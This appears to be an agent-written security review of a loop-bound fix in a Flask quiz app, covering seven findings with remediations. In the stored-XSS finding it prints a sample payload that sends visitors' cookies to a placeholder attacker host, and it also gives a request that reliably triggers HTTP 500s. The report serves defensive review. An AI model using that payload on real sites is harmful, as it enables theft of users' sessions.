# Security Report — Bug 001 Fix Review

**Reviewed:** `context/bugs/001/fix-summary.md`
**Change under review:** `src/app.py:32` — `for i in range(len(answers) - 1):` → `for i in range(len(answers)):`
**Read in full for adjacent-code risk:** `src/app.py` (entire module), `src/static/quiz.js`,
`src/static/index.html`, `src/requirements.txt`, `src/static/` inventory.
**Method:** static review only. No file was modified; no state-changing command was run.

**Verdict:** the fix is functionally correct and introduces no injection, secret-handling, or crypto
defect. It does, however, *widen* an unvalidated, attacker-controlled loop bound by one iteration,
turning a previously-survivable malformed request into an unhandled 500 (Finding 1 — a genuine
regression of this change). Issues 2–7 are **pre-existing** but are reported because they sit on the
same unauthenticated request path the fixed line executes in, and two of them compose with Finding 1.

---

## Findings

### 1. MEDIUM — Unvalidated `answers` length causes an unhandled `IndexError` (regression introduced by this fix)

**Location:** `src/app.py:32-34` (the changed loop), reached from `src/app.py:59-64`

`answers` arrives straight from the request body (`request.get_json(force=True)` at line 59,
`data.get("answers", [])` at line 61) with no length or type check, yet the loop is bounded by
`len(answers)` while it indexes `questions[i]`. The old bound `len(answers) - 1` absorbed one extra
element; the new bound does not.

**Failure scenario** (10 questions in `questions.json`):
`POST /api/submit {"name":"x","answers":[0,0,0,0,0,0,0,0,0,0,0]}` (11 answers) →
`questions[10]` → `IndexError: list index out of range` → HTTP 500. That exact request returned 200
before the fix. `[0]*100000` makes it trivially repeatable, so any unauthenticated client can
generate unbounded 500s.

Same missing validation, related outcomes:
- `answers` = `"0123456789"` (string) — `len()` succeeds, elements are characters, never equal to an
  int `answer_index`; the request silently scores 0 instead of being rejected.
- `answers` = `5` or `{"0":1}` — `TypeError`/`KeyError` → HTTP 500.

**Remediation:** validate the payload in `submit()` before scoring — return 400 unless `answers` is a
`list`, `len(answers) == len(questions)`, and every element is an `int` within
`range(len(questions[i]["choices"]))`. As defence in depth make `compute_score` unable to overrun
regardless of caller, e.g. iterate `zip(answers, questions)` or
`range(min(len(answers), len(questions)))`.

---

### 2. HIGH — Stored XSS: leaderboard names rendered via `innerHTML` (pre-existing, directly downstream of the fixed path)

**Location:** sink `src/static/quiz.js:90`; tainted source `src/app.py:60`, persisted `src/app.py:67-68`,
served `src/app.py:73-77`

```js
leaderboardList.innerHTML += `<li>${entry.name} — ${entry.score}</li>`;
```

`name` is accepted from any JSON body, only `.strip()`ed (no escaping, no length cap, no allow-list),
written verbatim to `leaderboard.json`, returned by `/api/leaderboard`, and concatenated into HTML.
The `maxlength` on the landing input is client-side only and irrelevant to a direct API call. The rest
of `quiz.js` correctly uses `textContent` (lines 44, 51, 80) — line 90 is the lone unsafe sink.

**Failure scenario:** `POST /api/submit {"name":"<img src=x onerror=fetch('//attacker/'+document.cookie)>",
"answers":[...]}`; every subsequent visitor who clicks "View Leaderboard" executes the payload in the
app's origin. Persistent, unauthenticated, affects all users.

**Remediation:** build the row with DOM APIs — `const li = document.createElement("li");
li.textContent = \`${entry.name} — ${entry.score}\`; leaderboardList.appendChild(li);` — matching the
safe pattern already used elsewhere in the file. Server-side, cap `name` (e.g. 40 chars) and restrict
it to an allow-list in `submit()` so hostile values never reach storage, and add a
`Content-Security-Policy` header without `unsafe-inline`.

---

### 3. HIGH — Flask debug mode enabled: Werkzeug debugger console (pre-existing)

**Location:** `src/app.py:81` — `app.run(debug=True, port=5000)`

The Werkzeug interactive debugger renders source, local variable values, and filesystem paths on any
unhandled exception, and evaluates arbitrary Python from the browser once the PIN is satisfied or
absent. Finding 1 is a reliable way to *reach* an unhandled exception, so the two compose. Default
binding is `127.0.0.1`, limiting this to local/adjacent attackers — hence HIGH, not CRITICAL; it
becomes CRITICAL the moment `host="0.0.0.0"` is added or a proxy is placed in front. Note the
fix-summary's own manual-verification step (`cd src && python3 app.py`) runs the app in this mode.

**Remediation:** default debug off and drive it from the environment —
`app.run(debug=os.environ.get("FLASK_DEBUG") == "1", host="127.0.0.1", port=5000)` — and run under a
real WSGI server (gunicorn/waitress) with debug disabled for anything non-local.

---

### 4. MEDIUM — No input validation, size limit, or rate limiting on `/api/submit`; unbounded file growth (pre-existing)

**Location:** `src/app.py:57-68`

The endpoint is unauthenticated, accepts an arbitrarily long `name` with no server-side cap, appends
one entry per request, and rewrites the entire `leaderboard.json` each time — with no request-size
limit, no rate limit, and no cap on retained entries. Repeated submissions grow the file without bound
(disk exhaustion) while every write re-serialises the whole list and every read re-parses it
(quadratic CPU/IO → degradation). Additionally, a non-dict JSON body (`[]`, `"x"`, `5`) makes
`data.get` raise `AttributeError` → HTTP 500.

**Remediation:** verify the parsed body is a dict; cap `name` length; set
`app.config["MAX_CONTENT_LENGTH"]`; trim the persisted list to the top N by score before
`save_leaderboard`; apply per-IP rate limiting (e.g. Flask-Limiter) to the submit route.

---

### 5. LOW — No CSRF protection on the state-changing POST, and `force=True` accepts any Content-Type (pre-existing)

**Location:** `src/app.py:57-59`

`/api/submit` mutates server state with no CSRF token and no `Origin`/`Referer` check, and
`get_json(force=True)` parses the body regardless of `Content-Type`. That admits the
preflight-exempt "simple request" path: an HTML form posting `text/plain` from any third-party page
writes attacker-chosen entries on behalf of a visitor. Direct impact is bogus leaderboard rows, but
combined with Finding 2 it is a viable delivery vector for the stored XSS payload.

**Remediation:** drop `force=True` so `application/json` is required (this alone forces a CORS
preflight for cross-origin requests), and reject requests whose `Origin` is not the app's own. If
sessions/cookies are introduced later, add a real CSRF token (e.g. `flask-wtf`).

---

### 6. LOW — Leaderboard read-modify-write is neither atomic nor locked (pre-existing)

**Location:** `src/app.py:25-27`, `src/app.py:66-68`

`load_leaderboard` → append → `save_leaderboard` runs unsynchronised, and `save_leaderboard`
truncates via `open(..., "w")` before writing. Two concurrent submissions lose an entry; a crash or a
concurrent read mid-write leaves a truncated file, after which `load_leaderboard` raises
`json.JSONDecodeError` and both `/api/submit` and `/api/leaderboard` return 500 permanently until the
file is repaired by hand. Integrity/availability, not confidentiality.

**Remediation:** `json.dump` to a temp file in the same directory then `os.replace` it into place for
atomicity; serialise the read-modify-write with a file lock (`fcntl.flock`) or move the data to a real
datastore; wrap `load_leaderboard` in `try/except` returning `[]` on a corrupt file.

---

### 7. LOW — Unpinned dependency (pre-existing)

**Location:** `src/requirements.txt:1` — `flask`

No version constraint and no hashes, so builds are not reproducible and a breaking or compromised
upstream release is installed silently. No *known-vulnerable* dependency was introduced by this fix —
it added no imports and no requirements.

**Remediation:** pin to a specific known-good version (`flask==<x.y.z>`), preferably with
`pip-compile --generate-hashes`, and wire `pip-audit` into CI.

---

## Checks performed that found nothing

Actively looked for and **not** present:

- **SQL injection** — no database, SQL, or ORM anywhere in the change or module.
- **Command injection** — no `os.system`, `subprocess`, `eval`, `exec`, `pickle`, or shell invocation.
- **Template injection** — no server-side templating (`render_template*`); static files only.
- **Log injection** — the application logs no user input.
- **Path traversal / arbitrary file access** — `QUESTIONS_PATH` and `LEADERBOARD_PATH` derive from
  `__file__` at import time (`src/app.py:6-8`); no request input reaches any path, and
  `send_static_file` receives the constant `"index.html"`.
- **Hardcoded secrets / keys / credentials** — none in `src/app.py`, `src/static/*`, or
  `src/requirements.txt`; no `SECRET_KEY`, token, or password literal in the app code.
- **Insecure / non-constant-time comparison of secrets** — the only comparison on the changed line is
  `answers[i] == questions[i]["answer_index"]`, an integer quiz answer. Not a secret, not
  authentication material, no timing-attack exposure; a constant-time compare is not warranted.
- **Answer-key leakage** — `/api/questions` (`src/app.py:50-53`) projects only `id`/`question`/`choices`
  and withholds `answer_index`; scoring stays server-side. The fix did not open a disclosure path.
- **Unsafe/outdated dependencies introduced by the fix** — none; the change is a one-line loop bound.
